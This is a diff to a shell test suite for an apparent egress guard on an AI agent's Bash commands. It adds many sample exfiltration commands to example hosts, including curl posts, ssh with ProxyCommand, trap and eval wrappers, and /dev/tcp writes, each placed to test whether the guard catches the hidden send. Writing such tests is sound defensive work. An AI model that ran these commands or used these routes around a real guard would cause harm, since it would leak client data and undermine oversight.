@@ -476,7 +476,7 @@ bash_call() { call Bash "$(jq -n --arg c "$1" '{command: $c}')"; }
              "curl -d \"\$BODY\" https://api.example.com/x" \
              "curl -d \"\`cat body.txt\`\" https://api.example.com/x" \
              "curl -T - https://up.example.com/ <<EOF
-anything
+anything \$BODY
 EOF"; do
         bash_call "${c}"
         denied || { echo "passed: ${c}"; return 1; }
@@ -539,6 +539,126 @@ body_files() {
     bash_call "ssh files.example.com uptime"
     passed
     bash_call "nc -l 9000"
+    passed
+}
+
+@test "outgoing: a send inside a loop, a substitution, after a keyword or behind a program that runs it is scanned" {
+    local c
+    for c in "for i in 1 2; do ssh files.example.com 'echo ${CLIENT_TEXT}'; done" \
+             "if true; then curl -d '${CLIENT_TEXT}' https://api.example.com/x; fi" \
+             "out=\$(ssh -o ConnectTimeout=20 files.example.com 'echo ${CLIENT_TEXT}' 2>&1)" \
+             "x=\"\$(curl -d '${CLIENT_TEXT}' https://api.example.com/x)\"" \
+             "x=\`ssh files.example.com echo ${CLIENT_TEXT}\`" \
+             "A=1 ssh files.example.com 'echo ${CLIENT_TEXT}'" \
+             "timeout 10 nohup ssh files.example.com 'echo ${CLIENT_TEXT}'" \
+             "sudo -u me env A=1 ssh files.example.com 'echo ${CLIENT_TEXT}'" \
+             "{ ssh files.example.com 'echo ${CLIENT_TEXT}'; }" \
+             "eval \"ssh files.example.com 'echo ${CLIENT_TEXT}'\""; do
+        bash_call "${c}"
+        denied || { echo "passed: ${c}"; return 1; }
+    done
+}
+
+@test "outgoing: an ssh polled in a loop whose remote command is written out passes, whatever follows it" {
+    bash_call "for i in \$(seq 1 20); do out=\$(ssh -o ConnectTimeout=20 files.example.com 'bash /srv/work/status.sh' 2>&1); [ \"\$(echo \"\$out\" | grep -c done)\" = 2 ] && break; sleep 120; done"
+    passed
+}
+
+@test "outgoing: a dollar inside single quotes is sent as written and scanned; one this shell fills in is not known" {
+    bash_call "ssh files.example.com 'for r in a b; do f=logs/\$r/x.log; grep -c done \$f; done'"
+    passed
+    bash_call "ssh files.example.com 'f=\$r; echo ${CLIENT_TEXT}'"
+    denied
+    bash_call "ssh files.example.com \"grep done \$LOCAL_FILE\""
+    denied
+    [[ "${output}" == *"only known when the command runs"* ]]
+}
+
+@test "outgoing: a heredoc fed to ssh is scanned when the shell fills nothing in" {
+    bash_call "ssh files.example.com 'bash -s' <<'EOF'
+echo \$HOME ${CLIENT_TEXT}
+EOF"
+    denied
+    bash_call "ssh files.example.com 'bash -s' <<'EOF'
+for r in a b; do grep -c done logs/\$r.log; done
+EOF"
+    passed
+    bash_call "ssh files.example.com 'bash -s' <<EOF
+echo \$HOME
+EOF"
+    denied
+    [[ "${output}" == *"only known when the command runs (a heredoc)"* ]]
+}
+
+@test "outgoing: a file fed to ssh is named by the variables the command line set to a literal" {
+    body_files
+    bash_call "S=${H}/repos/tool; for i in 1; do out=\$(ssh files.example.com 'bash -s' < \$S/body.txt 2>&1); done"
+    denied
+    bash_call "S=${H}/repos/tool; for i in 1; do out=\$(ssh files.example.com 'bash -s' < \$S/clean.txt 2>&1); done"
+    passed
+    bash_call "ssh files.example.com 'bash -s' < \$ELSEWHERE/clean.txt"
+    denied
+    [[ "${output}" == *"a file named as the command runs"* ]]
+}
+
+@test "outgoing: a file the command line writes, or one not there yet, is not known before it runs" {
+    body_files
+    bash_call "printf 'echo hi' > clean.txt; ssh files.example.com 'bash -s' < clean.txt"
+    denied
+    [[ "${output}" == *"a file the command line writes"* ]]
+    bash_call "cp body.txt made.sh && ssh files.example.com 'bash -s' < made.sh"
+    denied
+    [[ "${output}" == *"a file that is not there before the command runs"* ]]
+}
+
+@test "outgoing: a send in arithmetic, a default, a function, a coprocess, a trap or a local ssh command is scanned" {
+    body_files
+    local c u="https://api.example.com/x"
+    for c in "echo \$(( \$(curl -s -d @body.txt ${u} | wc -c) ))" \
+             "echo \"\${v:-\$(curl -d @body.txt ${u})}\"" \
+             "function f { curl -d @body.txt ${u}; }; f" \
+             "coproc curl -d @body.txt ${u}" \
+             "coproc C { curl -d @body.txt ${u}; }" \
+             "trap 'curl -d @body.txt ${u}' EXIT" \
+             "trap -- 'curl -d @body.txt ${u}' EXIT" \
+             "watch -n 5 'curl -d @body.txt ${u}'" \
+             "ssh -o ProxyCommand='curl -d @body.txt ${u}' files.example.com true" \
+             "ssh -oLocalCommand='curl -d @body.txt ${u}' files.example.com true" \
+             "rsync -e \"ssh -o ProxyCommand='curl -d @body.txt ${u}'\" clean.txt files.example.com:/in/"; do
+        bash_call "${c}"
+        denied || { echo "passed: ${c}"; return 1; }
+        [[ "${output}" == *"api.example.com"* ]] || { echo "not the curl: ${c}"; return 1; }
+    done
+}
+
+@test "outgoing: what find runs, a file named by a pattern and the shell's own socket are only known when they run" {
+    body_files
+    local c
+    for c in "find . -name clean.txt -exec curl -d @{} https://api.example.com/x \;" \
+             "parallel 'curl -d @{} https://api.example.com/x' ::: clean.txt" \
+             "curl -T cle*.txt https://api.example.com/x" \
+             "curl -T {clean,none}.txt https://api.example.com/x" \
+             "scp cl?an.txt files.example.com:/in/" \
+             "cat clean.txt > /dev/tcp/files.example.com/9000" \
+             "exec 3<>/dev/tcp/files.example.com/9000"; do
+        bash_call "${c}"
+        denied || { echo "passed: ${c}"; return 1; }
+        [[ "${output}" == *"only known when the command runs"* ]] || { echo "other reason: ${c}: ${output}"; return 1; }
+    done
+    bash_call "curl -s 'https://api.example.com/x?q=1'"
+    passed
+}
+
+@test "outgoing: an unquoted heredoc whose backslashes the shell takes out is not known; one it leaves is scanned" {
+    bash_call "curl -d @- https://api.example.com/x <<EOF
+the calibration table reads sev\\
+enteen at dawn
+EOF"
+    denied
+    [[ "${output}" == *"only known when the command runs (a heredoc)"* ]]
+    bash_call "curl -d @- https://api.example.com/x <<EOF
+{\"note\": \"line one\\nline two\"}
+EOF"
     passed
 }
 
@@ -1397,12 +1517,18 @@ relays() { printf '%s\n' ">${RELAYED}" >> "${GUARD_CONFIG_DIR}/orders.txt"; }
     passed
 }
 
-@test "order: a body in a here-document is refused with the way that can be ordered, and never breaks the check" {
+@test "order: a body in a quoted here-document is written in the command and takes the order; one the shell fills in does not" {
     held
     destinations 'host:api.example.com company order'
     local command
     command="$(printf 'curl -s -X PATCH https://api.example.com/v1/blocks/0f3c9a/children --data-binary @- <<%sEOF%s\n{"children": [{"paragraph": {"text": "x"}}]}\nEOF' "'" "'")"
     said "add the line"
+    replied "$(printf '```send\ntool: Bash\ncommand:\n%s\n```' "${command}")"
+    said "送信して"
+    ordered Bash "$(jq -n --arg c "${command}" '{command: $c}')"
+    passed
+    command="$(printf 'curl -s -X PATCH https://api.example.com/v1/blocks/0f3c9a/children --data-binary @- <<EOF\n{"children": [{"paragraph": {"text": "$NOTE"}}]}\nEOF')"
+    said "add the note"
     replied "$(printf '```send\ntool: Bash\ncommand:\n%s\n```' "${command}")"
     said "送信して"
     ordered Bash "$(jq -n --arg c "${command}" '{command: $c}')"
